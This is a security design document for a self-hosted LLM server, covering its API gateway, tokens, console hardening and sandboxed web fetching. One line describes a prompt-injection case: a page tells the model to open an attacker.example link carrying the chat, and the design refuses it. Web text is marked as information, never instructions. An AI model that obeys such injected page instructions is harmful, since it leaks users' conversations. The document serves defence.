# Security model

How the server keeps its API and its console to the people meant to use them. This file describes what is built and running.

## What is defended

- Any device on the LAN or Wi-Fi (guests, IoT, a compromised laptop) using the model or the console without permission.
- Web pages in your own browser attacking the server: CSRF, DNS rebinding, cross-site WebSocket.
- A leaked token. Scope, expiry, allowed networks and the listener limit what it can do, revocation takes effect within a
  second, and the request log shows where it is used.
- Password guessing against the console.
- A bug in the gateway or the console turning into root.
- A web page the chat's model reads, trying to make it leak your conversation or reach into your network (see "Web access
  for the chat").

Out of scope: someone with a shell as the service user (the user who ran setup) or root, physical access, or a malicious VM host.

## Ports

| Port | Who listens | Reachable from |
| --- | --- | --- |
| 8080 | `outcrop-gateway`: the OpenAI and Anthropic APIs; `GET /` redirects to Strata's page in the console | the LAN, with a token |
| 8443 | `outcrop-gateway`: the same on HTTPS, with the console's certificate (for apps that trust the CA) | the LAN, with a token |
| 11434 | `outcrop-gateway`: the Ollama API | the LAN, with a token |
| 18080 | Strata, with an internal key | loopback only |
| 11435 | the Ollama bridge | loopback only |
| 443, 80 | `outcrop-console` (HTTPS; port 80 serves the CA certificate and redirects) | the LAN |
| 22 | sshd, keys only | the LAN |
| 8888 | SearXNG, the chat's web search (a container) | loopback only |
| `/run/outcrop-fetch/fetch.sock` | `outcrop-fetch`, the chat's page fetcher | the console (group `outcrop-fetch`) |

Strata and the bridge bind to 127.0.0.1, so nothing on the LAN can go around the gateway. Strata requires the internal key in
`~/.outcrop/state/upstream_key`, which only the gateway and the console send. A process on this machine without that key gets a 401
from Strata too.

## API tokens

- A token is `lls_` + an 8-character public ID + `_` + 32 random base62 characters (about 190 bits). The public ID appears in
  logs and the UI; the rest is never stored. An imported token is a value you choose (at least 24 characters).
- The database holds only HMAC-SHA256(pepper, token). The pepper is `~/.outcrop/state/pepper` (0600), outside the database, so a
  copy of the database alone cannot be used to test guesses.
- A token is shown once, when it is created or rotated. An unknown key that arrives is logged as its first 4 characters.
- Each token has scopes, listeners, optional allowed networks, an optional expiry, optional request-rate and concurrency
  limits, and a record of its last use (time, address, app).
- **Scopes:** `inference` (chat, messages, responses, token counting, the model list, the Ollama API), `telemetry`
  (read-only metrics), `admin` (Strata's own controls: load and unload, settings, config, slots, `/status`), `web` (the web tools for
  apps, `POST /tools/mcp`). An admin token can do everything.
- **Rotate** gives a token a new secret and keeps its name, history and settings. The old secret works for the grace you
  choose (none, 1 h, 24 h or 7 days).
- **Revoke** takes effect within a second: `outcrop` tells the gateway at once, and the gateway also polls the database's
  `data_version` every second. `--disconnect` also cancels the token's running requests.
- The `local-tools` token (`~/.outcrop/state/local_token`, 0600) is what `outcrop` and `bench/` use on this machine. It may be used
  only from loopback (to use it from the server's own LAN address, add that address to it). There is no "trust localhost" rule: a tunnel on this machine would make
  remote traffic look local.

```sh
outcrop token create laptop [--scope inference] [--expires 90d] [--cidr 192.168.1.0/24] [--listener ollama]
outcrop token list | show NAME | rotate NAME --grace 24h | revoke NAME --disconnect
outcrop token import NAME < value.txt       # keep a key your apps already use
```

## Auth modes

- **Enforced** (the default): every request that is not on a public route needs a valid token.
- **Open until a time** (`outcrop auth open 30m [--only 192.168.1.30] [--listener ollama]`, at most 24 h): requests without a
  usable token (none, unknown, revoked, expired, or not allowed on that port, address or route) are allowed on the
  model and telemetry routes, and recorded as anonymous with the reason. Valid tokens are still recognized.
  The window is checked on every request, so it cannot be missed. When it ends the gateway writes "the API closed by itself"
  to the audit log. While open, `/health` says `"auth": "open"` and `outcrop status` shows it.
- **What stays protected while open:** admin routes still need an admin token; the gateway answers only to its own names in
  `Host` (DNS rebinding); it refuses browser POSTs from other sites unless their origin is listed for CORS (a page on one
  of the server's own names counts only on the gateway's or console's ports, and a loopback page only as the same
  origin); the body limits stay; requests without a token are limited to 120 a minute per address (and 480 per IPv6
  /64, so rotating addresses doesn't help). The web tools are
  never open: they always need a token with the `web` scope.
- **The token-less Ollama option** (`outcrop auth tokenless on --only 192.168.1.40`) is off, with no addresses. When on, it
  lets only the listed addresses use the Ollama port without a token, with the same browser checks. A small adapter that adds
  the token for such an app is the better fix.

## Route classes: deny by default

| Class | Routes | Needs |
| --- | --- | --- |
| public | `GET /` and Strata's page assets (`/web/*`, `/fonts/*`); `GET /health`; `OPTIONS` | nothing |
| inference | `POST /v1/chat/completions`, `/v1/messages`, `/v1/messages/count_tokens`, `/v1/responses` (and sub-paths), `/v1/images/generations`; `GET /v1/models`, `/models`, `/v1/images/files/*`; on 11434: `/api/tags`, `/api/show`, `/api/chat`, `/api/generate`, `/api/version`, `/api/ps` and the `/v1` chat routes | `inference` or `admin` |
| telemetry | `GET /metrics`, `/metrics/prometheus`, `/v1/telemetry`, `/v1/status`, `/slots`, `/props` | `telemetry` or `admin` |
| admin | `POST /load`, `/unload`, `/v1/load`, `/v1/unload`, `/v1/vram`, `/settings`, `/config`, `/slots/*`; `GET /status`, `/config`, `/settings`, `/mcp`, `/api/requests`, `/tool-media/*` | `admin` |
| anything else | | 404 from the gateway; it never reaches Strata |

Paths are matched on the raw path, without decoding and with trailing slashes removed, exactly as Strata matches them. A path
with `..`, `//`, a backslash or an encoded character in a public prefix is refused, and a `.` or `..` segment is refused on
every route. Credentials are read from `Authorization: Bearer …` or `x-api-key: …`, never from the query string; the same
`Authorization` or `x-api-key` header twice is refused. Refusals use each
API's own error format (OpenAI, Anthropic, Ollama), so SDKs show a readable message.

`/health` is public and carries what Strata's own `/health` does (model name, context, picture support, loaded) plus the auth
mode. Strata's chat page needs those fields.

## What the gateway sends on

It removes the client's `Authorization`, `x-api-key`, `Cookie` and hop-by-hop headers, sets `Host` to Strata's loopback
address, adds the internal key, `X-Forwarded-For` (the real client address; any client-sent value is replaced) and
`X-Request-Id`. An `Origin` that matches the page's own host (Strata's chat page) is rewritten to Strata's address, so Strata
still treats its own page as its own; any other origin is passed on unchanged, and Strata refuses it for its controls.

## The console

- **Transport:** HTTPS on 443 with a certificate from a private CA that is name-constrained to this server's names and
  addresses (a certificate it signs for any other name fails verification; tested). Port 80 serves only the CA certificate,
  its install page, and a redirect. HSTS is turned on in Settings once your devices trust the CA.
- **Sign-in:** one account, its password set over SSH only (`outcrop console passwd`): at least 16 characters, not among the
  100,000 most common breached passwords, zxcvbn 4 of 4, no server names in it; argon2id (64 MiB, 3 passes). Lockout per
  address after 5 failures (1 minute, doubling to an hour), a global slowdown above 20 failures an hour, the same answer and
  time for a wrong user as for a wrong password.
- **Sessions:** a 256-bit ID in `__Host-outcrop` (Secure, HttpOnly, SameSite=Strict), stored as its SHA-256; a new ID at every
  sign-in; 12 h idle or 30 days remembered, 30 days at most. Changing the password ends the other sessions.
- **Every change** needs JSON, the header `X-Outcrop: 1` and an Origin equal to the console's own; the WebSocket checks Origin
  at the upgrade and the session again every 5 minutes. Actions that widen access ask for the password again after 10
  minutes: admin tokens, opening the API for over an hour, the token-less option, CORS, Telegram, editing presets.json,
  downloading a backup.
- **Headers:** a CSP without inline scripts and with `frame-ancestors 'none'`, `nosniff`, `no-referrer`, `X-Frame-Options:
  DENY`, COOP and CORP same-origin, a Permissions-Policy, `no-store` on the API. Every asset is served locally.
- **Strata's own page inside the console** runs in a CSP sandbox with an opaque origin (`null`), reached through a random
  capability URL. The link works for 12 hours, and only while the session that made it lasts; it is a bearer link, not tied
  to the browser. Its CSP lets it load nothing from other sites, so an answer it renders cannot send the chat elsewhere.
  Tested in Chromium: it can use Strata, and a request from it to the console's API is refused, so a bug in that page
  cannot act as you in the console. Its `POST`s (to Strata, and the page's stored preferences) are outside `/api/`, so
  the link, not the CSRF check, is what protects them.
- **The preset editor** accepts engines only by name from `~/.outcrop/bin` and refuses loader and interpreter variables
  (`LD_*`, `PYTHON*`, `PATH`, …), so an edit cannot run another program.
- **Privileges:** the console runs as the service user with `NoNewPrivileges`, only `CAP_NET_BIND_SERVICE` (for 80 and 443), a read-only
  home except its state, the rendered configs, presets.json and bench results, and only the GPU device files it needs. It
  controls units only through the polkit rule.
- **Checks:** an OWASP ZAP baseline scan found no high-risk issue.

## Web access for the chat

The model can search the web and read pages only in the console's own chat, and only while the chat's 🌐 switch and the
master switch in Settings are on. The API never offers tools, and the gateway removes Strata's `strata_mcp` field from
every request, in whatever encoding the JSON comes (a BOM, UTF-16 or UTF-32), so no app can switch on the engine's own
tools. Pictures in requests must be `data:` URLs (or base64): given a file path or a link, Strata would read the file or
download the link itself, unsandboxed, so the gateway refuses those with a 400.

- **The provenance rule.** `open_page` opens only links that came back from a search in this chat, or links the user
  wrote. A link's `#fragment` is dropped before it is opened and before it becomes a citation, so it can't carry data
  out on a click. A page that tells the model to open `https://attacker.example/?d=<your chat>` gets a refusal, which the chat
  shows. What is left is the search query, which goes to the search engines (not to the page's author) and is shown live
  in the chat.
- **Web text is marked untrusted.** Results and pages reach the model between markers that call them information, never
  instructions.
- **Nothing loads in your browser by itself.** The console shows no remote images (its CSP allows images only from
  itself) and loads no site icons. Links open on a click, without a referrer.
- **"Ask before opening pages"** (Settings) makes every page wait for your click.
- **The page fetcher, `outcrop-fetch.service`:**
  - its own system user, with no home and no access to `/home` (`ProtectHome=yes`);
  - its code and Python environment are in root-owned `/opt/outcrop-fetch`;
  - an empty capability set, `PrivateUsers`, `MemoryDenyWriteExecute`, a system-call filter, and memory and CPU limits.
- **The kernel refuses its connections to this machine and the LAN.** `IPAddressDeny` covers localhost, link-local,
  multicast and the private, carrier-grade NAT and ULA ranges, plus `::/96`, `::ffff:0:0/96`, the NAT64 prefixes,
  `fe80::/10`, `fec0::/10` and the other reserved IPv4 ranges (`0.0.0.0/8`, `192.0.0.0/24`, `198.18.0.0/15`,
  `240.0.0.0/4`), with only
  systemd-resolved's stub (127.0.0.53) allowed for DNS. At start the fetcher checks that connections to 127.0.0.1:22,
  127.0.0.1:443, `[::1]:443` and the LAN's gateway are dropped. If one gets through, it opens nothing, `GET /health`
  reports `isolated: false`, and it checks again every minute.
- **The fetcher's code checks as well:**
  - only http and https, on ports 80 and 443, with no user:password in links;
  - it resolves every name itself, refuses unless all of its addresses are public, and connects to the address it
    checked, so a second lookup can't swap it (DNS rebinding);
  - every redirect is checked the same way, at most 5 of them, and never from https to http;
  - it refuses this machine's own addresses (read from its interfaces) and the home's public IPv4, so a page can't
    reach the router's admin page or a port forward through the public address. The public address comes from
    api.ipify.org, every 6 hours, which therefore sees the home's IP; `OUTCROP_FETCH_WAN_ECHO` changes or disables that;
  - NAT64 addresses are judged by the address they wrap; IPv4-compatible and 6to4 forms are refused;
  - 15 s and 5 MB to download; only HTML, text and PDF; compressed bodies refused;
  - the page becomes text in a child process with CPU, memory and 10 s limits, so a hostile page can't tie the fetcher up;
  - no cookies, no JavaScript and no Referer; the journal records only the host of each page opened.
- **Web text can't pose as anything else:** runs of `<<<`, `>>>`, `[[` and `]]` in pages, titles and snippets are broken
  up, so a page can't forge the markers or a citation number.

  Checked on the reference server: the router's address, the same address through `nip.io`, `localtest.me`, the
  server's ULA address and its own `.local` name were all refused.
- **SearXNG** runs in a container on 127.0.0.1:8888 only:
  - its image is pinned by digest;
  - a read-only filesystem, every capability dropped, its own unprivileged user, and memory and process limits;
  - a Docker network of its own, whose traffic to private addresses the firewall drops (DNS to the router excepted),
    so a search engine that took the container over could not reach the LAN.

  It asks the search engines without cookies or an account. They see the query and your home IP address, but no key
  links your queries together.
- **On StartOS** ([STARTOS.md](STARTOS.md)) there is no systemd and no Docker inside the service's container, so the
  same isolation is built from a network namespace of its own (`docker/webnet.sh`), joined to the container by a veth
  pair. Both the page fetcher and SearXNG run in it:
  - nftables in two layers, the container's and the namespace's own: DNS to StartOS's resolver and the public internet
    are allowed. Loopback, the private, carrier-grade NAT, link-local and other reserved IPv4 ranges, all of IPv6, the
    container's own address and services (the gateway, the console, Strata), and StartOS's host are dropped;
  - the fetcher runs as its own user, without new privileges or capabilities, from the same hash-locked environment as
    on Ubuntu, and its start-up check probes StartOS's host (which answers HTTP from the container), so a missing rule
    turns every page into a refusal;
  - SearXNG is the very image Ubuntu runs (its files, at the same digest), chrooted with a read-only root, as its own
    user 977, with its settings readable only by that user;
  - the data volume is the service user's alone (0750), so neither of them can read it;
  - `docker/test-webnet.sh` checks it from inside the namespace: 17 destinations that must be unreachable, the internet
    and DNS that must work, SearXNG's results and the fetcher's verdict. On the StartOS test server: 22 of 22.
  - What systemd adds on Ubuntu and the container does not have: `MemoryDenyWriteExecute`, the system-call filter, and
    the per-service memory and CPU limits. The fetcher's own per-page limits (CPU, memory, 10 s, in a child process)
    still apply.
- **What it changes for privacy:**
  - Every search query is text the model wrote from your conversation, and it goes to the search engines.
  - Every page opened sees your home IP address.
  - Nothing else leaves the network. The record of what went out is the chat itself, where every query and page is
    shown, and Overview counts them.
- **Web tools for apps** (`POST /tools/mcp` on the gateway's ports; [CONNECT-WEB.md](CONNECT-WEB.md)): an MCP endpoint
  with the same search and fetcher, for apps that run their own agent.
  - **Who can use it:** a token needs the `web` scope, which no token has unless granted. Open mode never covers it.
    The master switch turns it off.
  - **The provenance rule is per token:** `open_page` opens only links from that token's own searches in the last 24
    hours. "Apps may open any public link" lifts that, and turning it on asks for the password again.
  - **Limits:** 30 calls a minute and 600 in any 24 hours per token. The day's count and each token's links are kept in the database
    (`web_calls`, `web_links`), so a restart resets neither.
  - **Admin tokens** have the web tools too: the admin scope can do everything.
  - **Checked on the server:** a never-searched link was refused, an inference-only token got a 403, and a revoked token
    a 401.
  - **What it cannot protect:** an app that also gives its model tools that act can be steered by a page into misusing
    them, inside the app. Grant `web` to apps that ask before acting.
- **Saved chats** are in `~/.outcrop/state/chats.db` (0600). A deleted chat is removed for good: SQLite's `secure_delete`
  overwrites it, the search index drops it (FTS5 secure-delete), and about 30 s later the WAL, which can still hold old
  copies of its pages, is emptied in the background (a daily maintenance also merges the index and empties the WAL).
  A note that starts a chat from a summary carries only the links the old chat could open. The audit log records that a chat was deleted, not what it said.

## Privileges

- The engine (`outcrop-engine@`) runs with `NoNewPrivileges` and without the Docker socket, so a bug in how it parses
  prompts or pictures can't use the service user's sudo or docker groups to become root.
- What the engine runs is checked where its config is made (`strata_presets.render`), not only in the console's
  editor: a plain engine name from `~/.outcrop/bin`, allowlisted environment variables, arguments without paths. A console
  that was taken over can write presets.json, but can't make the engine run something else. The rendered config holds
  Strata's internal key and is 0600.
- No LLM service (the gateway, console, bridge, engine and certificate renewal) can read home-directory secrets: `~/.ssh`, `~/.gnupg`, GitHub and Docker credentials, shell history and
  keyrings are inaccessible to the gateway, the console, the bridge and the engine. The gateway can't read the CA's
  private key either.
- The gateway runs as the service user under systemd sandboxing: `NoNewPrivileges`, an empty capability set,
  `ProtectSystem=strict`, `ProtectHome=read-only` with only `~/.outcrop/state` writable, `PrivateTmp`, `PrivateDevices`,
  `RestrictAddressFamilies`, `MemoryDenyWriteExecute`, `SystemCallFilter=@system-service`, and memory and task limits.
  The console the same, except: `CAP_NET_BIND_SERVICE` (ports 80 and 443), the two GPU device files (for its GPU
  figures), no `MemoryDenyWriteExecute`, and write access to `~/.outcrop/cfg`, presets.json and `bench/results` as well.
  `sudo` cannot work inside them. If the service user is in the `docker` group (setup does not add it; it builds the UI
  with `sudo docker` otherwise), the services inherit that; the Docker socket is made inaccessible to the gateway, the
  console and the bridge, so taking over one of them does not lead to root through Docker.
- Request bodies are limited before anything reads them: the console takes 1 MB (32 MB where pictures go); the gateway
  64 MiB on conversation routes and 1 MiB elsewhere. The console checks at most 3 passwords at once and one at a time per address (per address, not per IPv6 /64: on a home LAN the /64 is every device, and one guest must not lock the owner out).
- The gateway's per-address limits (logged refusals 30 a minute, requests without a token 120 a minute, 256
  connections) count each address, and each IPv6 /64 at four times the limit: a home LAN is one /64, so devices don't
  share a limit, and one device rotating through its /64's addresses is still stopped. At most 300 refused requests a minute are written to the request log
  in all; past that, one summary row a minute.
- A polkit rule (`/etc/polkit-1/rules.d/50-outcrop.rules`) lets the service user start, stop and restart (and try-restart, reload-or-restart and reset-failed) only `outcrop-engine@*`,
  `outcrop-boot`, `outcrop-gateway`, `outcrop-console`, `outcrop-ollama-bridge`, `outcrop-fetch` and `outcrop-searxng`. Unit files cannot
  be changed through it, and no other unit can be controlled.
- The boot default is a file, `~/.outcrop/state/default_preset`, read at boot by `outcrop-boot.service` through a root-owned
  script that checks the name, and that the preset exists, before it goes into a unit name. A preset that fails five times
in ten minutes stays down rather than restarting forever (a switch clears that count before it starts the preset, so
switching back and forth is never refused).
- The control socket `/run/outcrop/gateway.sock` is 0660 in a 0750 directory, both owned by the service user.

## Secrets at rest

`~/.outcrop/state/` is 0700 and holds `outcrop.db` (with its WAL), `chats.db` (the saved chats), `pepper`, `upstream_key`,
`local_token`, `console_token` and `telegram.json`, each 0600, and `tls/` (the keys 0600; the certificates and
`meta.json` 0644, as they are public). None of them are in the repo, and `.gitignore` keeps `*.db` and `state/` out.
`/etc/outcrop-searxng/settings.yml` holds SearXNG's secret, readable by root and the container's user only.

## When something fails

- **The gateway stops:** the API is down (it fails closed). systemd restarts it after 2 s.
- **The database cannot be read:** the gateway keeps serving from the tokens it has in memory, and reports `db.error` on the
  Timeline. The request log keeps rows it could not write for the next try (up to 50,000).
- **Strata is starting, switching or stopped:** requests that need the model wait up to 120 s at the gateway and are answered
  by the new preset; after that they get a 503 with `Retry-After`. A request that finds Strata's port closed waits the same
  way and is tried once more; one slow health probe does not close the gate (two in a row do). At most 256 requests wait;
  more get a 503 at once. A client that hangs up is cancelled in Strata within a second and a half, on the Ollama port too.
- **Slow or large requests:** headers must arrive within 20 s, and a body within 30 s idle or 300 s in all (408). At most
  256 connections per address. Bodies: 64 MiB on conversation routes, 1 MiB elsewhere, and at most 512 MiB held in memory (until a body has been
  passed to Strata, including while it waits in a hold)
  at once (503 beyond it); a body with an absurd number of JSON values gets a 413 before it is parsed.
- **Emergency:** `outcrop gateway bypass` stops the gateway and restarts Strata on the LAN at port 8080 with one new emergency
  token as its key (printed once), plus the local-tools token. Per-token rules, open mode and the request log are off until
  `outcrop gateway restore`.

## Checking it

- `outcrop auth` shows the mode and the clients that called without a valid token in the last 7 days.
- `outcrop audit` prints the audit log: token changes, opening and closing, switches.
- `python3 bench/apitest.py --host 192.168.1.20 --key TOKEN` (13 checks) and `--no-key` (every check refused).
- `cd console && uv run pytest` runs the backend's tests (about 290), among them the refusals above, revocation timing,
  rotation grace, expiry, open-mode limits and expiry, the token-less option, cancellation on hang-up, the fetcher's
  refusals, and the fixes from a security review.
